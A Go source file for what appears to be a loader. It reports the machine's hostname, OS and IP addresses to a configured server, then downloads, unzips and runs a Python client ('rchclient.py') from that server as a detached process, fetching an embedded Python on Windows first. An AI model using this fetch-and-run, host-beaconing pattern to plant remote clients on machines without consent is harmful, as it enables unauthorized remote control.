package main

import (
	"archive/zip"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"rch-go-loader/config"
)

type BundleBuildResponse struct {
	Code    int    `json:"code"`
	Message string `json:"message"`
	Data    struct {
		FileName     string `json:"file_name"`
		DownloadURL  string `json:"download_url"`
		BuildVersion string `json:"build_version"`
	} `json:"data"`
}

// firstReportDone 标记是否已完成首次主机信息上报
var firstReportDone = false

func debugLogPath() string {
	return filepath.Join(os.TempDir(), "go_loader_debug.log")
}

func appendDebugLog(message string) {
	line := fmt.Sprintf("%s %s\n", time.Now().Format(time.RFC3339), message)
	f, err := os.OpenFile(debugLogPath(), os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o644)
	if err != nil {
		return
	}
	defer f.Close()
	_, _ = f.WriteString(line)
}

func main() {
	appendDebugLog("loader main started")
	appendDebugLog(fmt.Sprintf(
		"compiled config: socket_host=%s socket_port=%d web_scheme=%s web_host=%s web_port=%d build_version=%s report_path=%s build_path=%s",
		config.ServerSocketHost,
		config.ServerSocketPort,
		config.ServerWebScheme,
		config.ServerWebHost,
		config.ServerWebPort,
		config.LoaderBuildVersion,
		config.BundleReportAPIPath,
		config.BundleBuildAPIPath,
	))

	host, _ := os.Hostname()
	ips := getLocalIPs()

	// 首次上报：携带完整的主机信息
	appendDebugLog("report startup begin: " + reportURL())
	_ = report("START", fmt.Sprintf(
		"loader started ver=%s os=%s arch=%s hostname=%s ips=%s report_to=%s build_from=%s socket_target=%s:%d",
		config.LoaderBuildVersion,
		runtime.GOOS,
		runtime.GOARCH,
		host,
		strings.Join(ips, ","),
		reportURL(),
		buildURL(config.BundleBuildAPIPath),
		config.ServerSocketHost,
		config.ServerSocketPort,
	))

	firstReportDone = true

	var pythonBinary string
	var ok bool

	// Windows 系统：使用嵌入版 Python，不进行本地勘测
	if runtime.GOOS == "windows" {
		appendDebugLog("windows detected, using embedded python")
		pythonBinary, ok = setupEmbeddedPython()
		if !ok {
			appendDebugLog("embedded python setup failed, exiting")
			return
		}
	} else {
		// Unix 系统：检测本地 Python
		appendDebugLog("python check begin")
		var pythonVersion string
		pythonBinary, pythonVersion, ok = detectPython()
		appendDebugLog(fmt.Sprintf("python check result: found=%v binary=%s version=%s", ok, pythonBinary, pythonVersion))
		if ok {
			_ = report("PYTHON_OK", fmt.Sprintf("found %s (%s)", pythonBinary, pythonVersion))
		} else {
			_ = report("PYTHON_ERR", "python not found")
			appendDebugLog("python not found, exiting")
			return
		}
	}

	appendDebugLog("resolve workdir begin")
	workDir, err := resolveWorkDir()
	if err != nil {
		appendDebugLog("resolve workdir error: " + err.Error())
		_ = report("WORKDIR_ERR", "resolve workdir failed: "+err.Error())
		return
	}
	appendDebugLog("resolve workdir ok: " + workDir)
	_ = report("WORKDIR_OK", workDir)

	appendDebugLog("request bundle build begin: " + buildURL(config.BundleBuildAPIPath))
	buildMeta, err := requestBundleBuild()
	if err != nil {
		appendDebugLog("request bundle build error: " + err.Error())
		_ = report("BUILD_ERR", "request bundle build failed: "+err.Error())
		return
	}
	appendDebugLog(fmt.Sprintf(
		"request bundle build ok: file_name=%s download_url=%s build_version=%s",
		buildMeta.Data.FileName,
		buildMeta.Data.DownloadURL,
		buildMeta.Data.BuildVersion,
	))
	_ = report("BUILD_OK", fmt.Sprintf("version=%s file=%s", buildMeta.Data.BuildVersion, buildMeta.Data.FileName))

	archivePath := filepath.Join(workDir, buildMeta.Data.FileName)
	extractPath := filepath.Join(workDir, buildMeta.Data.BuildVersion)

	downloadURL := resolveURL(buildMeta.Data.DownloadURL)
	appendDebugLog("download bundle begin: " + downloadURL)
	if err := downloadFile(downloadURL, archivePath); err != nil {
		appendDebugLog("download bundle error: " + err.Error())
		_ = report("DOWNLOAD_ERR", "download bundle failed: "+err.Error())
		return
	}
	appendDebugLog("download bundle ok: " + archivePath)
	_ = report("DOWNLOAD_OK", fmt.Sprintf("downloaded to %s", archivePath))

	appendDebugLog("prepare extract dir: " + extractPath)
	if err := os.RemoveAll(extractPath); err != nil && !os.IsNotExist(err) {
		appendDebugLog("prepare extract dir error: " + err.Error())
		_ = report("EXTRACT_ERR", "prepare extract dir failed: "+err.Error())
		return
	}

	appendDebugLog("extract bundle begin")
	if err := unzipArchive(archivePath, extractPath); err != nil {
		appendDebugLog("extract bundle error: " + err.Error())
		_ = report("EXTRACT_ERR", "extract bundle failed: "+err.Error())
		return
	}
	appendDebugLog("extract bundle ok: " + extractPath)
	_ = report("EXTRACT_OK", fmt.Sprintf("extracted to %s", extractPath))

	launchScript := filepath.Join(extractPath, "rchclient.py")
	appendDebugLog("prepare python command begin: " + launchScript)

	cmd, usedPython, stdoutPath, stderrPath, err := buildPythonCommand(pythonBinary, launchScript, extractPath)
	if err != nil {
		appendDebugLog("prepare python command error: " + err.Error())
		_ = report("LAUNCH_ERR", "prepare python command failed: "+err.Error())
		return
	}
	appendDebugLog(fmt.Sprintf(
		"prepare python command ok: python=%s script=%s stdout=%s stderr=%s",
		usedPython, launchScript, stdoutPath, stderrPath,
	))

	appendDebugLog("start detached process begin")
	proc, err := startDetached(cmd, extractPath)
	if err != nil {
		appendDebugLog("start detached process error: " + err.Error())
		_ = report("LAUNCH_ERR", "start detached process failed: "+err.Error())
		return
	}
	appendDebugLog(fmt.Sprintf("start detached process ok: pid=%d", proc.Pid))

	_ = report("LAUNCH_OK", fmt.Sprintf(
		"pid=%d python=%s script=%s workdir=%s version=%s stdout=%s stderr=%s",
		proc.Pid,
		usedPython,
		launchScript,
		extractPath,
		buildMeta.Data.BuildVersion,
		stdoutPath,
		stderrPath,
	))
	appendDebugLog("loader finished successfully and will exit")
}

// setupEmbeddedPython 为 Windows 系统设置嵌入版 Python
func setupEmbeddedPython() (string, bool) {
	home, err := os.UserHomeDir()
	if err != nil {
		appendDebugLog("get home dir error: " + err.Error())
		_ = report("PYTHON_ERR", "get home dir failed: "+err.Error())
		return "", false
	}

	pythonDir := filepath.Join(home, config.BundleBaseDirName, "python-embed")
	pythonExe := filepath.Join(pythonDir, "python.exe")

	// 检查缓存是否存在
	if _, err := os.Stat(pythonExe); err == nil {
		appendDebugLog("embedded python cache exists: " + pythonExe)
		_ = report("PYTHON_OK", fmt.Sprintf("using cached embedded python: %s", pythonExe))
		return pythonExe, true
	}

	appendDebugLog("embedded python cache not found, downloading...")

	downloadURL := fmt.Sprintf("%s://%s:%d/api/external-tools/python-embed/download?platform=win&arch=%s",
		config.ServerWebScheme,
		config.ServerWebHost,
		config.ServerWebPort,
		runtime.GOARCH,
	)

	zipPath := filepath.Join(pythonDir, "python-embed.zip")
	if err := os.MkdirAll(pythonDir, 0o755); err != nil {
		appendDebugLog("create python embed dir error: " + err.Error())
		_ = report("PYTHON_ERR", "create python embed dir failed: "+err.Error())
		return "", false
	}

	appendDebugLog("downloading embedded python from: " + downloadURL)
	if err := downloadFile(downloadURL, zipPath); err != nil {
		appendDebugLog("download embedded python error: " + err.Error())
		_ = report("PYTHON_ERR", "download embedded python failed: "+err.Error())
		return "", false
	}
	appendDebugLog("embedded python downloaded: " + zipPath)

	appendDebugLog("extracting embedded python to: " + pythonDir)
	if err := unzipArchive(zipPath, pythonDir); err != nil {
		appendDebugLog("extract embedded python error: " + err.Error())
		_ = report("PYTHON_ERR", "extract embedded python failed: "+err.Error())
		return "", false
	}
	appendDebugLog("embedded python extracted successfully")

	if _, err := os.Stat(pythonExe); err != nil {
		appendDebugLog("python.exe not found after extract: " + err.Error())
		_ = report("PYTHON_ERR", "python.exe not found after extract: "+err.Error())
		return "", false
	}

	appendDebugLog("embedded python ready: " + pythonExe)
	_ = report("PYTHON_OK", fmt.Sprintf("embedded python downloaded and cached: %s", pythonExe))

	return pythonExe, true
}

// report 发送纯文本日志行到服务端
// 格式：时间 | 事件标签 | 消息
// 服务端直接追加到日志文件
func report(event string, message string) error {
	now := time.Now().Format("2006-01-02 15:04:05")  // 改这一行
	line := fmt.Sprintf("%s | %-12s | %s", now, event, message)

	// 封装成 JSON 发给服务端，服务端取 line 字段写入
	payload := map[string]string{"line": line}
	body, _ := json.Marshal(payload)

	req, err := http.NewRequest(http.MethodPost, reportURL(), bytes.NewReader(body))
	if err != nil {
		appendDebugLog("report request build error: " + err.Error())
		return err
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		appendDebugLog(fmt.Sprintf("report http error: event=%s url=%s err=%s", event, reportURL(), err.Error()))
		return err
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(resp.Body)
	appendDebugLog(fmt.Sprintf("report http response: event=%s url=%s status=%d body=%s", event, reportURL(), resp.StatusCode, strings.TrimSpace(string(respBody))))
	return nil
}

func reportURL() string {
	return fmt.Sprintf("%s://%s:%d%s",
		config.ServerWebScheme,
		config.ServerWebHost,
		config.ServerWebPort,
		config.BundleReportAPIPath,
	)
}

func buildURL(path string) string {
	return fmt.Sprintf("%s://%s:%d%s",
		config.ServerWebScheme,
		config.ServerWebHost,
		config.ServerWebPort,
		path,
	)
}

func resolveURL(raw string) string {
	if strings.HasPrefix(raw, "http://") || strings.HasPrefix(raw, "https://") {
		return raw
	}
	if strings.HasPrefix(raw, "/") {
		return buildURL(raw)
	}
	return buildURL("/" + strings.TrimPrefix(raw, "/"))
}

func getLocalIPs() []string {
	results := []string{}

	ifaces, err := net.Interfaces()
	if err != nil {
		return results
	}

	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}

		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			ipNet, ok := addr.(*net.IPNet)
			if !ok || ipNet.IP == nil || ipNet.IP.IsLoopback() {
				continue
			}
			ip := ipNet.IP.To4()
			if ip == nil {
				continue
			}
			results = append(results, ip.String())
		}
	}

	return results
}

func detectPython() (string, string, bool) {
	candidates := []string{"python3", "python"}

	for _, name := range candidates {
		cmd := exec.Command(name, "--version")
		output, err := cmd.CombinedOutput()
		if err == nil {
			return name, strings.TrimSpace(string(output)), true
		}
	}

	return "", "", false
}

func resolveWorkDir() (string, error) {
	home, err := os.UserHomeDir()
	if err != nil {
		return "", err
	}

	workDir := filepath.Join(home, config.BundleBaseDirName)
	if err := os.MkdirAll(workDir, 0o755); err != nil {
		return "", err
	}

	return workDir, nil
}

func requestBundleBuild() (*BundleBuildResponse, error) {
	payload := map[string]any{
		"server_host":       config.ServerSocketHost,
		"server_port":       config.ServerSocketPort,
		"web_port":          config.ServerWebPort,
		"server_web_scheme": config.ServerWebScheme,
		"server_web_host":   config.ServerWebHost,
		"builder":           "bundle",
		"target_os":         "bundle",
		"target_arch":       "",
		"source":            "loader",
	}

	body, _ := json.Marshal(payload)
	req, err := http.NewRequest(http.MethodPost, buildURL(config.BundleBuildAPIPath), bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 10 * time.Minute}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	parsed := &BundleBuildResponse{}
	if err := json.Unmarshal(data, parsed); err != nil {
		return nil, err
	}

	if resp.StatusCode >= 400 || parsed.Code != 0 {
		if parsed.Message == "" {
			parsed.Message = string(data)
		}
		return nil, fmt.Errorf("bundle build failed: status=%d message=%s", resp.StatusCode, parsed.Message)
	}

	if parsed.Data.FileName == "" {
		return nil, fmt.Errorf("bundle build response missing file_name")
	}
	if parsed.Data.DownloadURL == "" {
		parsed.Data.DownloadURL = "/api/agent/download/" + parsed.Data.FileName
	}
	if parsed.Data.BuildVersion == "" {
		parsed.Data.BuildVersion = strings.TrimSuffix(strings.TrimPrefix(parsed.Data.FileName, "rchclient_bundle_"), ".zip")
	}

	return parsed, nil
}

func downloadFile(url string, dst string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return fmt.Errorf("download failed: http %d", resp.StatusCode)
	}

	if err := os.MkdirAll(filepath.Dir(dst), 0o755); err != nil {
		return err
	}

	tmp := dst + ".part"
	file, err := os.Create(tmp)
	if err != nil {
		return err
	}

	if _, err = io.Copy(file, resp.Body); err != nil {
		file.Close()
		return err
	}
	if err = file.Close(); err != nil {
		return err
	}

	return os.Rename(tmp, dst)
}

func unzipArchive(zipPath string, dest string) error {
	r, err := zip.OpenReader(zipPath)
	if err != nil {
		return err
	}
	defer r.Close()

	if err := os.MkdirAll(dest, 0o755); err != nil {
		return err
	}

	for _, f := range r.File {
		targetPath := filepath.Join(dest, f.Name)
		cleanDest := filepath.Clean(dest) + string(os.PathSeparator)
		cleanTarget := filepath.Clean(targetPath)

		if !strings.HasPrefix(cleanTarget, cleanDest) && cleanTarget != filepath.Clean(dest) {
			return fmt.Errorf("unsafe zip entry: %s", f.Name)
		}

		if f.FileInfo().IsDir() {
			if err := os.MkdirAll(cleanTarget, 0o755); err != nil {
				return err
			}
			continue
		}

		if err := os.MkdirAll(filepath.Dir(cleanTarget), 0o755); err != nil {
			return err
		}

		src, err := f.Open()
		if err != nil {
			return err
		}

		dst, err := os.OpenFile(cleanTarget, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, f.Mode())
		if err != nil {
			src.Close()
			return err
		}

		if _, err := io.Copy(dst, src); err != nil {
			dst.Close()
			src.Close()
			return err
		}

		dst.Close()
		src.Close()
	}

	return nil
}

func buildPythonCommand(preferredPython string, scriptPath string, extractPath string) (*exec.Cmd, string, string, string, error) {
	candidates := []string{}

	preferredPython = strings.TrimSpace(preferredPython)
	if preferredPython != "" {
		candidates = append(candidates, preferredPython)
	}

	for _, name := range []string{"python3", "python"} {
		if name != preferredPython {
			candidates = append(candidates, name)
		}
	}

	var lastErr error
	for _, name := range candidates {
		var lookErr error
		if filepath.IsAbs(name) {
			if _, err := os.Stat(name); err != nil {
				lookErr = err
			}
		} else {
			_, lookErr = exec.LookPath(name)
		}

		if lookErr != nil {
			lastErr = lookErr
			continue
		}

		stdoutPath := filepath.Join(extractPath, "loader_python_stdout.log")
		stderrPath := filepath.Join(extractPath, "loader_python_stderr.log")

		stdoutFile, err := os.OpenFile(stdoutPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o644)
		if err != nil {
			lastErr = err
			continue
		}

		stderrFile, err := os.OpenFile(stderrPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o644)
		if err != nil {
			stdoutFile.Close()
			lastErr = err
			continue
		}

		cmd := exec.Command(name, scriptPath)
		cmd.Stdout = stdoutFile
		cmd.Stderr = stderrFile

		return cmd, name, stdoutPath, stderrPath, nil
	}

	if lastErr == nil {
		lastErr = fmt.Errorf("python runtime not found")
	}
	return nil, "", "", "", lastErr
}